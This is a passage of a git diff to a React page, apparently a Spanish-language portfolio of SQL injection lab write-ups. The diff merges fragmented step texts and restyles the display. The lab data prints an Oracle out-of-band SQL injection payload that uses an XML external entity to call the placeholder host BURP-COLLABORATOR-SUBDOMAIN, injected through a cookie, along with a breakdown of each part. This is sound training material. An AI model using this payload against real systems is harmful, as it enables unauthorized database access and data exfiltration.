-                text: "entrada. Al ser una base de datos Oracle, se selecciona un payload que",
-                code: ""
-            },
-            {
-                title: "Paso 5",
-                text: "combine SQLi con una entidad externa XML.",
-                code: ""
-            },
-            {
-                title: "Paso 6",
-                text: "●​ Configuración del Atacante: En una auditoría profesional, se generaría un",
-                code: ""
-            },
-            {
-                title: "Paso 7",
-                text: "subdominio único en la pestaña de Burp Collaborator. Para efectos de este",
-                code: ""
-            },
-            {
-                title: "Paso 8",
-                text: "reporte técnico, se utiliza el marcador de posición",
-                code: ""
-            },
-            {
-                title: "Paso 9",
-                text: "BURP-COLLABORATOR-SUBDOMAIN.",
+                text: "entrada. Al ser una base de datos Oracle, se selecciona un payload que combine SQLi con una entidad externa XML. Configuración del Atacante: En una auditoría profesional, se generaría un subdominio único en la pestaña de Burp Collaborator. Para efectos de este reporte técnico, se utiliza el marcador de posición BURP-COLLABORATOR-SUBDOMAIN.",
                 code: ""
             },
             {
@@ -1362,92 +707,7 @@ const labsData = [
             },
             {
                 title: "Paso 11",
-                text: "version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote",
-                code: ""
-            },
-            {
-                title: "Paso 12",
-                text: "SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAIN/\"> %remote;]>'),'/l')",
-                code: ""
-            },
-            {
-                title: "Paso 13",
-                text: "FROM dual--",
-                code: ""
-            },
-            {
-                title: "Paso 14",
-                text: "●​ Codificación: El payload se debe codificar en formato URL (URL Encoding)",
-                code: ""
-            },
-            {
-                title: "Paso 15",
-                text: "para asegurar que los caracteres especiales como < y > sean procesados",
-                code: ""
-            },
-            {
-                title: "Paso 16",
-                text: "correctamente por el servidor web.",
-                code: ""
-            },
-            {
-                title: "Paso 17",
-                text: "●​ Ejecución: Se envía la petición modificada desde el Repeater. El servidor",
-                code: ""
-            },
-            {
-                title: "Paso 18",
-                text: "procesa la cookie, ejecuta la consulta SQL y, al intentar resolver el XML, la base",
-                code: ""
-            },
-            {
-                title: "Paso 19",
-                text: "de datos realiza una petición DNS al dominio del atacante.",
-                code: ""
-            },
-            {
-                title: "Paso 20",
-                text: "●​ Resultado: En el servidor de Burp Collaborator se recibiría un \"DNS lookup\", lo",
-                code: ""
-            },
-            {
-                title: "Paso 21",
-                text: "cual confirma la existencia de la vulnerabilidad y la capacidad de ejecutar",
-                code: ""
-            },
-            {
-                title: "Paso 22",
-                text: "comandos que interactúan con sistemas externos.",
-                code: ""
-            },
-            {
-                title: "Paso 23",
-                text: "Para esta primera parte tenemos que ir a estas dos opciones, “Proxy” y despues a",
-                code: ""
-            },
-            {
-                title: "Paso 24",
-                text: "“intercept”.",
-                code: ""
-            },
-            {
-                title: "Paso 25",
-                text: "abrimos el browser y pegamos la url del lab",
-                code: ""
-            },
-            {
-                title: "Paso 26",
-                text: "encendemos la opcion intercept on",
-                code: ""
-            },
-            {
-                title: "Paso 27",
-                text: "Interceptamos algunas señales después de refrescar la página.",
-                code: ""
-            },
-            {
-                title: "Paso 28",
-                text: "En esta parte del panel izquierdo, básicamente hice el copy-paste del payload que",
+                text: "version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://BURP-COLLABORATOR-SUBDOMAIN/\"> %remote;]>'),'/l') FROM dual-- Codificación: El payload se debe codificar en formato URL (URL Encoding) para asegurar que los caracteres especiales como < y > sean procesados correctamente por el servidor web. Ejecución: Se envía la petición modificada desde el Repeater. El servidor procesa la cookie, ejecuta la consulta SQL y, al intentar resolver el XML, la base de datos realiza una petición DNS al dominio del atacante. Resultado: En el servidor de Burp Collaborator se recibiría un \"DNS lookup\", lo cual confirma la existencia de la vulnerabilidad y la capacidad de ejecutar comandos que interactúan con sistemas externos. Para esta primera parte tenemos que ir a estas dos opciones, “Proxy” y despues a “intercept”. abrimos el browser y pegamos la url del lab encendemos la opcion intercept on Interceptamos algunas señales después de refrescar la página. En esta parte del panel izquierdo, básicamente hice el copy-paste del payload que",
                 code: ""
             },
             {
@@ -1457,32 +717,7 @@ const labsData = [
             },
             {
                 title: "Paso 30",
-                text: "único campo que la aplicación rastrea.",
-                code: ""
-            },
-            {
-                title: "Paso 31",
-                text: "Como el payload tiene símbolos raros (brackets, comillas, etc.), seleccioné todo el texto",
-                code: ""
-            },
-            {
-                title: "Paso 32",
-                text: "y le di Ctrl + U. Eso hizo que Burp lo codifica automáticamente a formato URL, que es",
-                code: ""
-            },
-            {
-                title: "Paso 33",
-                text: "como el servidor lo necesita para entenderlo sin marcar error. Después, solo le di al",
-                code: ""
-            },
-            {
-                title: "Paso 34",
-                text: "botón de 'Send' para lanzar el ataque al servidor",
-                code: ""
-            },
-            {
-                title: "Paso 35",
-                text: "En la captura se observa que, tras inyectar el payload de interacción OAST en la cookie",
+                text: "único campo que la aplicación rastrea. Como el payload tiene símbolos raros (brackets, comillas, etc.), seleccioné todo el texto y le di Ctrl + U. Eso hizo que Burp lo codifica automáticamente a formato URL, que es como el servidor lo necesita para entenderlo sin marcar error. Después, solo le di al botón de 'Send' para lanzar el ataque al servidor En la captura se observa que, tras inyectar el payload de interacción OAST en la cookie",
                 code: ""
             },
             {
@@ -1492,27 +727,7 @@ const labsData = [
             },
             {
                 title: "Paso 37",
-                text: "demuestra que la vulnerabilidad existe, ya que el sistema procesó una lógica de",
-                code: ""
-            },
-            {
-                title: "Paso 38",
-                text: "consulta no autorizada que involucra funciones de red de la base de datos (Oracle),",
-                code: ""
-            },
-            {
-                title: "Paso 39",
-                text: "confirmando la capacidad de provocar interacciones con servidores externos.",
-                code: ""
-            },
-            {
-                title: "Paso 40",
-                text: "Confirmación de",
-                code: ""
-            },
-            {
-                title: "Análisis del Payload",
-                text: "●​ x' UNION SELECT...: Se utiliza la comilla simple para romper la cadena original  de la consulta SQL y el comando UNION para inyectar nuestra propia sentencia  personalizada.  ●​ EXTRACTVALUE(): Es una función de Oracle que busca extraer datos de un  XML. Aquí se usa como \"disparador\" para forzar a la base de datos a realizar  una acción externa.  ●​ xmltype(): Crea un documento XML dentro de la base de datos que contiene la  instrucción de buscar una entidad en un servidor externo.  ●​ http://BURP-COLLABORATOR-SUBDOMAIN/: Es la dirección del atacante. Al  intentar resolver este dominio para cargar el XML, el servidor revela que es  vulnerable.  ●​ --: Estos guiones sirven para comentar el resto de la consulta original de la  aplicación, evitando que el servidor marque un error de sintaxis y asegurando  que nuestra inyección se ejecute limpiamente.",
+                text: "demuestra que la vulnerabilidad existe, ya que el sistema procesó una lógica de consulta no autorizada que involucra funciones de red de la base de datos (Oracle), confirmando la capacidad de provocar interacciones con servidores externos. Confirmación de x' UNION SELECT...: Se utiliza la comilla simple para romper la cadena original  de la consulta SQL y el comando UNION para inyectar nuestra propia sentencia  personalizada.  ●​ EXTRACTVALUE(): Es una función de Oracle que busca extraer datos de un  XML. Aquí se usa como \"disparador\" para forzar a la base de datos a realizar  una acción externa.  ●​ xmltype(): Crea un documento XML dentro de la base de datos que contiene la  instrucción de buscar una entidad en un servidor externo.  ●​ http://BURP-COLLABORATOR-SUBDOMAIN/: Es la dirección del atacante. Al  intentar resolver este dominio para cargar el XML, el servidor revela que es  vulnerable.  ●​ --: Estos guiones sirven para comentar el resto de la consulta original de la  aplicación, evitando que el servidor marque un error de sintaxis y asegurando  que nuestra inyección se ejecute limpiamente.",
                 code: ""
             },
         ],
@@ -1759,30 +974,24 @@ const SQLInjectionLabs = () => {
                             <FaCode className="absolute top-4 right-4 text-4xl text-yellow-500/5 opacity-50" />
 
                             <h4 className="text-yellow-500 text-sm md:text-base font-bold tracking-widest uppercase mb-4 flex items-center gap-2 border-b border-yellow-500/20 pb-3">
-                                <FaCode /> Desarrollo Técnico de la Explotación
+                                <FaCode /> Bitácora de Explotación Técnica
                             </h4>
 
                             {activeLab.steps ? (
-                                <div className="space-y-0 mt-4 relative">
-                                    {/* Timeline line */}
-                                    <div className="absolute left-3.5 top-2 bottom-6 w-px bg-yellow-500/20 -z-0"></div>
-
+                                <div className="mt-4 relative space-y-3">
                                     {activeLab.steps.map((step, index) => (
-                                        <div key={index} className="flex gap-4 relative z-10 pb-6 group">
-                                            <div className="flex flex-col items-center">
-                                                <div className="flex items-center justify-center w-7 h-7 bg-[#0a0f1a] rounded-full text-yellow-500 text-sm md:text-base font-bold border border-yellow-500/50 shadow-[0_0_10px_rgba(234,179,8,0.2)] group-hover:scale-110 group-hover:bg-yellow-500/10 transition-all">
-                                                    {index + 1}
-                                                </div>
-                                            </div>
+                                        <div key={index} className="flex gap-4 relative z-10 px-2 group">
                                             <div className="pt-1 flex-1">
-                                                <h5 className="text-yellow-400 text-sm md:text-base font-bold mb-2 tracking-wide">{step.title}</h5>
-                                                <p className="text-sm leading-relaxed mb-3 text-gray-200">
-                                                    {step.text}
-                                                </p>
+                                                {step.text && (
+                                                    <p className="text-sm md:text-base leading-relaxed mb-1 text-gray-200 text-justify">
+                                                        <span className="text-yellow-500/80 mr-2 font-bold opacity-70">▹</span> 
+                                                        {step.text.replace(/\s+/g, ' ')}
+                                                    </p>
+                                                )}
                                                 {step.code && (
-                                                    <div className="bg-black border border-gray-800 p-3 rounded-md text-green-400 font-mono text-xs md:text-sm break-all shadow-inner block w-full relative group-hover:border-gray-600 transition-colors">
-                                                        <div className="absolute top-0 left-0 w-1 h-full bg-green-500 rounded-l-md opacity-50"></div>
-                                                        $ {step.code}
+                                                    <div className="bg-[#050505] border border-gray-800 p-4 rounded-lg text-green-400 font-mono text-xs md:text-sm break-all shadow-xl block w-full relative group-hover:border-green-900/50 transition-colors my-4">
+                                                        <div className="absolute top-0 left-0 w-1 h-full bg-green-500 rounded-l-md opacity-80"></div>
+                                                        <span className="text-red-500 font-bold mr-2">root@hacker:~#</span> {step.code}
                                                     </div>
                                                 )}
                                             </div>
@@ -1790,8 +999,8 @@ const SQLInjectionLabs = () => {
                                     ))}
                                 </div>
                             ) : (
-                                <p className="text-sm text-gray-300 leading-relaxed">
-                                    {activeLab.analysis}
+                                <p className="text-sm md:text-base text-gray-300 leading-relaxed px-2 text-justify">
+                                    <span className="text-yellow-500/80 mr-2 font-bold opacity-70">▹</span> {activeLab.analysis}
                                 </p>
                             )}
                         </div>
